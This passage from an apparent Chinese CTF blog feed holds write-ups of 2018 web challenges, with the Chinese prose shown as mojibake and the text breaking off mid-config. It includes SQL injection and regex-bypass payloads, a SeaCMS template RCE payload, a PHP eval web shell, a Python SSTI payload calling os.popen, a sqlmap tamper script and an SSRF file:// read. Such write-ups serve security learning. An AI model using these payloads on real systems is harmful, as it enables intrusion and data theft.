class="string">"SELECT `id`,`name`,`key` FROM `users` WHERE `id` = $id AND `key` = '"</span>.$key.<span class="string">"'"</span>;</span><br><span class="line">$q = $db-&gt;query($query);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($q-&gt;num_rows) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;h3&gt;Users:&lt;/h3&gt;&lt;ul&gt;'</span>;</span><br><span class="line">    <span class="keyword">while</span>($row = $q-&gt;fetch_array()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;li&gt;'</span>.$row[<span class="string">'name'</span>].<span class="string">'&lt;/li&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/ul&gt;'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;    </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'&lt;h3&gt;Nop.&lt;/h3&gt;'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†å¥½å¤šä½†æ˜¯â€`â€æ²¡æœ‰è¿‡æ»¤ï¼Œä½¿ç”¨%00æˆªæ–­è¿›è¡Œæˆªæ–­</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=`id`;%00</span><br></pre></td></tr></table></figure><h2 id="0x18-ç»•æ­£åˆ™"><a href="#0x18-ç»•æ­£åˆ™" class="headerlink" title="0x18 ç»•æ­£åˆ™"></a>0x18 ç»•æ­£åˆ™</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'id'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/'(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i"</span>, $_REQUEST[<span class="string">'id'</span>]))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Attack detected!!!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select * from xxx where id = '&#123;$_GET['id']&#125;'"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line">$result = sql_query($_GET[<span class="string">'id'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé¢˜ç›®ç»•æ­£åˆ™æ²¡ä»€ä¹ˆæ„æ€ï¼Œä¸»è¦æ˜¯æƒ³å†æä¸€ä¸‹<code>$_REQUEST</code>å˜é‡è¦†ç›–é—®é¢˜</p><p>æ•°æ®åŠ è½½çš„é¡ºåº:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Environment-&gt;Get-&gt;Post-&gt;Cookie-&gt;Server</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GETä¼ å‚</span><br><span class="line">?id=1&apos; union select * from flag %23</span><br><span class="line">åŒæ—¶POSTä¼ å‚</span><br><span class="line">id=1</span><br></pre></td></tr></table></figure><h2 id="00-å‚è€ƒæ–‡ç« "><a href="#00-å‚è€ƒæ–‡ç« " class="headerlink" title="00.å‚è€ƒæ–‡ç« "></a>00.å‚è€ƒæ–‡ç« </h2><p><a href="https://www.cnblogs.com/REscan/p/7043705.html" target="_blank" rel="noopener">ctfä¸­sqlæ³¨å…¥ä¸‹çš„ä¸€äº›å°æŠ€å·§</a></p><p><a href="https://xz.aliyun.com/t/253#toc-0" target="_blank" rel="noopener">MYSQLæŠ¥é”™æ³¨å…¥çš„ä¸€ç‚¹æ€»ç»“</a></p><p><a href="https://klionsec.github.io/2016/05/13/mysql-error-injection/" target="_blank" rel="noopener">sqlæ³¨å…¥å…¥é—¨ ä¹‹ mysql æ˜¾é”™æ³¨å…¥ [ floor()æ˜¾é”™ ]</a></p><p><a href="http://www.zhutougg.com/2017/01/16/mysqlshu-ju-ku-de-12chong-bao-cuo-zhu-ru/" target="_blank" rel="noopener">MySQLæ•°æ®åº“çš„12ç§çˆ†é”™æ³¨å…¥</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-httpå¤´xffçš„æ—¶é—´ç›²æ³¨&quot;&gt;&lt;a href=&quot;#0x01-httpå¤´xffçš„æ—¶é—´ç›²æ³¨&quot; class=&quot;headerlink&quot; title=&quot;0x01 httpå¤´xffçš„æ—¶é—´ç›²æ³¨&quot;&gt;&lt;/a&gt;0x01 httpå¤´xffçš„æ—¶é—´ç›²æ³¨&lt;/h2&gt;&lt;p&gt;é¢˜ç›®ä»£ç å¦‚ä¸‹
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>æ¹–å—çœç¬¬äºŒå±Šå¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨æŠ€èƒ½ç«èµ›åˆèµ›å®è·µé‡èµ›-Web</title>
    <link href="http://zer0yu.github.io/2018/11/23/2018-The-Second-HNCyber-Web-writeup/"/>
    <id>http://zer0yu.github.io/2018/11/23/2018-The-Second-HNCyber-Web-writeup/</id>
    <published>2018-11-23T12:33:42.000Z</published>
    <updated>2018-11-23T12:34:14.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-code-audit"><a href="#0x01-code-audit" class="headerlink" title="0x01 code audit"></a>0x01 code audit</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°:"></a>é¢˜ç›®æè¿°:</h3><p>101.71.29.5:10039</p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ:"></a>é¢˜ç›®åˆ†æ:</h3><p>æœ‰ç™»é™†åŠŸèƒ½ä½†æ˜¯æ²¡æœ‰æ³¨å†ŒåŠŸèƒ½ï¼Œæ‰€ä»¥è¦ä¹ˆsqliè¦ä¹ˆçˆ†ç ´å¯†ç ï¼Œæœ€ç»ˆçˆ†ç ´å¾—åˆ°å¼±å£ä»¤è¿›å…¥åå°ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">admin123</span><br></pre></td></tr></table></figure><p>Backupæœ‰æç¤ºæºç æ–‡ä»¶å’Œflagæ–‡ä»¶åœ¨æœåŠ¡å™¨ä¸Šçš„ä½ç½®</p><p>å®¡è®¡æºç ï¼Œå‘ç°å…¶å®æ˜¯CVE-2018-14421çš„ç®€åŒ–ç‰ˆæœ¬ï¼Œä½¿ç”¨å¦‚ä¸‹payloadæ¥æ„æˆrce</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zeroyu</span><br><span class="line">&#123;if:1)$GLOBALS[&apos;_G&apos;.&apos;ET&apos;][zeroyu]($GLOBALS[&apos;_G&apos;.&apos;ET&apos;][cool]);die();//&#125;&#123;end if&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„ä¸€ç‚¹è¿™ä¸ªidçš„å€¼æ˜¯è¦çœ‹å“åº”åŒ…çš„ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10039//web/index.php?r=content%2Fshow&amp;id=8&amp;zeroyu=system&amp;cool=cat%20/tmp/flag</span><br></pre></td></tr></table></figure></p><p>æœ€åè¯»å–flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;65bb1dd503d2a682b47fde40571598f4&#125;</span><br></pre></td></tr></table></figure></p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p>1.è¿™ç¯‡æ–‡ç« æ˜¯ä»payloadå‡ºå‘æ¥åˆ†æè§¦å‘ç‚¹çš„ï¼Œå¾ˆå…·æœ‰å€Ÿé‰´æ„ä¹‰â€“&gt;<br><a href="https://www.anquanke.com/post/id/152764" target="_blank" rel="noopener">CVE-2018-14421â€”â€”Seacmsåå°getshellåˆ†æ</a></p><p>æ–‡ç« ä¸­æåˆ°ä¸€ç‚¹</p><blockquote><p>htmæ–‡ä»¶åœ¨å¼€å‘ä¸­å°±åªæ˜¯æ¨¡æ¿æ–‡ä»¶ï¼Œéœ€è¦æœ‰æ§åˆ¶å™¨æ¥æ¸²æŸ“ï¼Œæ¸²æŸ“ä¸€èˆ¬éƒ½æ˜¯æœ‰includeï¼Œrenderï¼Œrender_templateç­‰ç­‰ä»£ç å…³é”®è¯ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªæ¥ç¡®å®šæ§åˆ¶å™¨ã€‚</p></blockquote><p>2.<a href="https://www.anquanke.com/post/id/153402" target="_blank" rel="noopener">seacms v6.61 å®¡è®¡æ·±å…¥æ€è€ƒ</a></p><h2 id="0x02-upload"><a href="#0x02-upload" class="headerlink" title="0x02 upload"></a>0x02 upload</h2><h3 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°:"></a>é¢˜ç›®æè¿°:</h3><p><a href="http://101.71.29.5:10031/index.php" target="_blank" rel="noopener">http://101.71.29.5:10031/index.php</a></p><h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ:"></a>é¢˜ç›®åˆ†æ:</h3><p>1.ä¸Šä¼ phpæ–‡ä»¶â€“&gt;ä¸Šä¼ å¤±è´¥å¹¶æç¤ºIt is not a image</p><p>2.burpæŠ“åŒ…å¹¶ä¿®æ”¹Content-Type: image/jpegå’Œæ–‡ä»¶åç¼€åâ€“&gt;ä¾æ—§ä¸Šä¼ å¤±è´¥</p><p>3.çŒœæµ‹å¯èƒ½æ˜¯åˆ¤æ–­äº†æ–‡ä»¶çš„æ ¼å¼ï¼Œæ¯”å¦‚æ–‡ä»¶å¤´ä»€ä¹ˆçš„ï¼Œæ‰€ä»¥æˆ‘åœ¨å›¾ç‰‡é‡Œè—äº†ä¸€æ®µPHPä»£ç è¿›è¡Œä¸Šä¼ â€“&gt;æˆåŠŸä¸Šä¼ ï¼Œä½†æ˜¯æ— æ³•è§£æ</p><p>4.ç›®æ ‡æ˜¯Apacheæœºå™¨ï¼Œè¿›è€Œæ„é€ <code>mu.jpg.php</code>åç¼€åè¿›è¡Œä¸Šä¼ â€“&gt;ä¸Šä¼ æˆåŠŸå¹¶ä¸”æˆåŠŸè§£æ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&apos;pass&apos;]) ?&gt;</span><br></pre></td></tr></table></figure><p><a href="https://i.loli.net/2018/11/23/5bf7f2e0069aa.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/23/5bf7f2e0069aa.png" alt="å±å¹•å¿«ç…§ 2018-11-23 ä¸‹åˆ1.52.01.png"></a></p><p>5.ä½¿ç”¨cknifeè¿›è¡Œè¿æ¥å¹¶æ‰¾åˆ°flag<br><a href="https://i.loli.net/2018/11/23/5bf7f2df1c527.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/23/5bf7f2df1c527.png" alt="å±å¹•å¿«ç…§ 2018-11-23 ä¸‹åˆ1.51.46.png"></a></p><h2 id="0x03-é«˜çº§æ¸—é€æµ‹è¯•"><a href="#0x03-é«˜çº§æ¸—é€æµ‹è¯•" class="headerlink" title="0x03 é«˜çº§æ¸—é€æµ‹è¯•"></a>0x03 é«˜çº§æ¸—é€æµ‹è¯•</h2><h3 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°:"></a>é¢˜ç›®æè¿°:</h3><p><a href="http://101.71.29.5:10050/" target="_blank" rel="noopener">http://101.71.29.5:10050/</a></p><h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ:"></a>é¢˜ç›®åˆ†æ:</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-code-audit&quot;&gt;&lt;a href=&quot;#0x01-code-audit&quot; class=&quot;headerlink&quot; title=&quot;0x01 code audit&quot;&gt;&lt;/a&gt;0x01 code audit&lt;/h2&gt;&lt;h3 id=&quot;é¢˜ç›®æè¿°&quot;&gt;&lt;a href
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2018-æ¹–æ¹˜æ¯-Web</title>
    <link href="http://zer0yu.github.io/2018/11/19/2018-hxb-Web-writeup/"/>
    <id>http://zer0yu.github.io/2018/11/19/2018-hxb-Web-writeup/</id>
    <published>2018-11-19T00:35:06.000Z</published>
    <updated>2018-11-19T00:36:49.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="WEB-XmeO"><a href="#WEB-XmeO" class="headerlink" title="WEB  XmeO"></a>WEB  XmeO</h2><p>é¢˜ç›®è§£æ:</p><p>æ˜¯ä¸€ä¸ªsstiç±»å‹æ¼æ´</p><p>playload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; [].__class__.__base__.__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].__dict__[<span class="string">'os'</span>].popen(<span class="string">'ls'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>å‚è€ƒ:</p><p>ä¹‹å‰ä¸€ç›´ä¹Ÿæ˜¯è¢«æ…å±ï¼Œåæ¥ä¸‹çº¿äº†æ²¡ç®¡ï¼Œç»“æœæœ€å5åˆ†é’Ÿä»–åˆä¸Šçº¿äº†ã€‚ã€‚ã€‚5åˆ†é’Ÿé‡Œè¿˜æŒ‚äº†3åˆ†é’Ÿï¼Œæ²¡ç¿»åˆ°flagï¼Œæ‰“æ‰°äº†ã€‚</p><p><a href="https://www.jianshu.com/p/6e4aebd18660" target="_blank" rel="noopener">https://www.jianshu.com/p/6e4aebd18660</a></p><p><a href="http://www.cnblogs.com/tyomcat/p/5440488.html" target="_blank" rel="noopener">http://www.cnblogs.com/tyomcat/p/5440488.html</a></p><p><a href="https://www.freebuf.com/articles/web/133336.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/133336.html</a></p><h2 id="WEB-Code-Check"><a href="#WEB-Code-Check" class="headerlink" title="WEB  Code Check"></a>WEB  Code Check</h2><p>é¢˜ç›®è§£æ:</p><p>ç›®å½•éå†å¾—åˆ°æºç (æˆ‘è¯´æˆ‘ä¹‹å‰æ˜¯ç™¾åº¦+çŒœè§£å¾—åˆ°åŠ è§£å¯†ç®—æ³•çš„ä½ æ•¢ä¿¡)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.108.176.234:49882/news/</span><br></pre></td></tr></table></figure></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'../config.php'</span>;</span><br><span class="line"><span class="comment">//è§£å¯†è¿‡ç¨‹</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,<span class="string">''</span>,MCRYPT_MODE_CBC,<span class="string">''</span>);</span><br><span class="line">mcrypt_generic_init($td,<span class="string">'ydhaqPQnexoaDuW3'</span>,<span class="string">'2018201920202021'</span>);</span><br><span class="line">$data = mdecrypt_generic($td,base64_decode(base64_decode($data)));</span><br><span class="line">mcrypt_generic_deinit($td);</span><br><span class="line">mcrypt_module_close($td);</span><br><span class="line"><span class="keyword">if</span>(substr(trim($data),<span class="number">-7</span>)!==<span class="string">'hxb2018'</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;script&gt;window.location.href="/index.php";&lt;/script&gt;'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> substr(trim($data),<span class="number">0</span>,strlen(trim($data))<span class="number">-7</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$id=decode($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$sql=<span class="string">"select id,title,content,time from notice where id=$id"</span>;</span><br><span class="line">$info=$link-&gt;query($sql);</span><br><span class="line">$arr=$info-&gt;fetch_assoc();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">&lt;title&gt;Xå…¬å¸HRç³»ç»ŸV1<span class="number">.0</span>&lt;/title&gt;</span><br><span class="line">&lt;style&gt;.body&#123;width:<span class="number">600</span>px;height:<span class="number">500</span>px;margin:<span class="number">0</span> auto&#125;.title&#123;color:red;height:<span class="number">60</span>px;line-height:<span class="number">60</span>px;font-size:<span class="number">30</span>px;font-weight:<span class="number">700</span>;margin-top:<span class="number">75</span>pt;border-bottom:<span class="number">2</span>px solid red;text-align:center&#125;.content,.title&#123;margin:<span class="number">0</span> auto;width:<span class="number">600</span>px;display:block&#125;.content&#123;height:<span class="number">30</span>px;line-height:<span class="number">30</span>px;font-size:<span class="number">18</span>px;margin-top:<span class="number">40</span>px;text-align:left;color:<span class="comment">#828282&#125;&lt;/style&gt;</span></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class="body"&gt;</span><br><span class="line">&lt;div class="title"&gt;&lt;?php echo $arr['title']?&gt;&lt;/div&gt;</span><br><span class="line">&lt;div class="content"&gt;&lt;?php echo $arr['content']?&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>dirsearch</code>æ‰«æè¿˜å‘ç°äº†phpinfoé¡µé¢<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.108.176.234:49882/0.php</span><br></pre></td></tr></table></figure></p><p>ä¾æ®è§£å¯†è¿‡ç¨‹å†™å‡ºåŠ å¯†è¿‡ç¨‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// header('content-type:text/html;charset=utf-8');</span></span><br><span class="line"><span class="comment">// require_once '../config.php';</span></span><br><span class="line"><span class="comment">//è§£å¯†è¿‡ç¨‹</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    $td = mcrypt_module_open(MCRYPT_RIJNDAEL_128, <span class="string">''</span>, MCRYPT_MODE_CBC, <span class="string">''</span>);</span><br><span class="line">    mcrypt_generic_init($td, <span class="string">'ydhaqPQnexoaDuW3'</span>, <span class="string">'2018201920202021'</span>);</span><br><span class="line">    $data = mdecrypt_generic($td, base64_decode(base64_decode($data)));</span><br><span class="line">    mcrypt_generic_deinit($td);</span><br><span class="line">    mcrypt_module_close($td);</span><br><span class="line">    <span class="keyword">if</span> (substr(trim($data), <span class="number">-7</span>) !== <span class="string">'hxb2018'</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;script&gt;window.location.href="/index.php";&lt;/script&gt;'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//        var_dump($data);</span></span><br><span class="line">        <span class="keyword">return</span> substr(trim($data), <span class="number">0</span>, strlen(trim($data)) - <span class="number">7</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    $td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,<span class="string">''</span>,MCRYPT_MODE_CBC,<span class="string">''</span>);</span><br><span class="line">    mcrypt_generic_init($td,<span class="string">'ydhaqPQnexoaDuW3'</span>,<span class="string">'2018201920202021'</span>);</span><br><span class="line">    $data = mcrypt_generic($td,$data);</span><br><span class="line">    mcrypt_generic_deinit($td);</span><br><span class="line">    mcrypt_module_close($td);</span><br><span class="line">    $data = base64_encode(base64_encode($data));</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line">$id = decode(<span class="string">"b3FCRU5iOU9IemZYc1JQSkY0WG5JZz09"</span>);</span><br><span class="line"><span class="comment">//echo $id;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//$deid=encode("2hxb2018");</span></span><br><span class="line">$enid=$_GET[<span class="string">'enid'</span>].<span class="string">"hxb2018"</span>;</span><br><span class="line">$deid=encode($enid);</span><br><span class="line"><span class="comment">//$id = decode($deid);</span></span><br><span class="line"><span class="keyword">echo</span> $deid;</span><br></pre></td></tr></table></figure></p><p>æˆ‘å°†åŠ å¯†ç®—æ³•æ”¾åœ¨äº†æœ¬åœ°æœåŠ¡å™¨ä¸Šç„¶åå†™äº†ä¸€ä¸ªsqlmapçš„tamperå»è¿›è¡Œæ³¨å…¥ã€‚<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file 'doc/COPYING' for copying permission</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.settings <span class="keyword">import</span> UNICODE_ENCODING</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOWEST</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        enurl=<span class="string">"http://localhost/footest/test.php?enid=&#123;&#125;"</span>.format(payload)</span><br><span class="line">        enpayload=requests.get(enurl)</span><br><span class="line">        <span class="keyword">return</span> enpayload.content</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload</span><br></pre></td></tr></table></figure></p><p>payloadå¦‚ä¸‹<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u<span class="string">"http://39.108.176.234:49882/news/list.php?id=b3FCRU5iOU9IemZYc1JQSkY0WG5JZz09"</span> --tamper 23333 -D <span class="string">"mozhe_discuz_stormgroup"</span> -T <span class="string">"notice2"</span> -C <span class="string">"title"</span> --dump</span><br></pre></td></tr></table></figure></p><p>æ³¨å…¥å¾—åˆ°çš„æ•°æ®å¦‚ä¸‹<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: mozhe_discuz_stormgroup</span><br><span class="line">Table: notice2</span><br><span class="line">[1 entry]</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| title                                     |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| hxb2018&#123;14ef3bd9a833a50b7ae24bbb0e4d57c8&#125; |</span><br><span class="line">+-------------------------------------------+</span><br></pre></td></tr></table></figure></p><p>å‚è€ƒ:</p><p>å°±æ˜¯ä¾æ®è¿™ä¸ªé“¾æ¥çŒœåˆ°æºç çš„å¤§æ¦‚</p><p><a href="http://cpsliang.com/archives/634" target="_blank" rel="noopener">http://cpsliang.com/archives/634</a></p><h2 id="WEB-Readflag"><a href="#WEB-Readflag" class="headerlink" title="WEB  Readflag"></a>WEB  Readflag</h2><p>é¢˜ç›®æè¿°:</p><p>æ¥éª—æˆ‘çš„flagå‘€~</p><p>47.107.145.220:80</p><p>è§£é¢˜åˆ†æ:</p><p>burpçš„intrude fuzzå¸¸è§é…ç½®æ–‡ä»¶è·¯å¾„ï¼Œå¾—åˆ°é…ç½®æ–‡ä»¶<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=file:///etc/apache2/sites-enabled/000-default.conf</span><br></pre></td></tr></table></figure></p><p>ä»é…ç½®æ–‡ä»¶ä¸­è¯»åˆ°webè·¯å¾„<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line"># The ServerName directive sets the request scheme, hostname and port that</span><br><span class="line"># the server uses to identify itself. This is used when creating</span><br><span class="line"># redirection URLs. In the context of virtual hosts, the ServerName</span><br><span class="line"># specifies what hostname must appear in the request&apos;s Host: header to</span><br><span class="line"># match this virtual host. For the default virtual host (this file) this</span><br><span class="line"># value is not decisive as it is used as a last resort host regardless.</span><br><span class="line"># However, you must set it for any further virtual host explicitly.</span><br><span class="line">#ServerName www.example.com</span><br><span class="line"></span><br><span class="line">ServerAdmin webmaster@localhost</span><br><span class="line">DocumentRoot /var/www/html/ssrf/web.php</span><br><span class="line"># Available loglevels: trace8, ..., trace1, debug, info, notice, warn,</span><br><span class="line"># error, crit, alert, emerg.</span><br><span class="line"># It is also possible to configure the loglevel for particular</span><br><span class="line"># modules, e.g.</span><br><span class="line">#LogLevel info ssl:warn</span><br><span 